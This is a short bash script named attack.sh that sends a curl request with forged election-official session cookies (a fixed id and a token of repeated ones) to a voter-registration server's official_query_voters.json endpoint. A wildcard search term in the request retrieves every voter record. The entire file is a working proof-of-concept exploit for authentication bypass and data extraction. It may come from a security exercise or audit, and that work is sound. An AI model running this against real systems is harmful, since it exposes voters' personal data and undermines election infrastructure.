#!/bin/bash

if [ -z "$1" ]
  then
    echo "usage: ./attack.sh [http|https]://<server_url>"
    exit
fi

SERVER_LOC=$1
echo "connecting to: $SERVER_LOC"

curl -v -L \
-b "electionofficialsession-id=1;electionofficialsession-token=111111111111111111111111111111111111111111111111111111111111111111" \
"$SERVER_LOC/bvrs/official_query_voters.json?field-name=lastname&field-contains=%25%25"
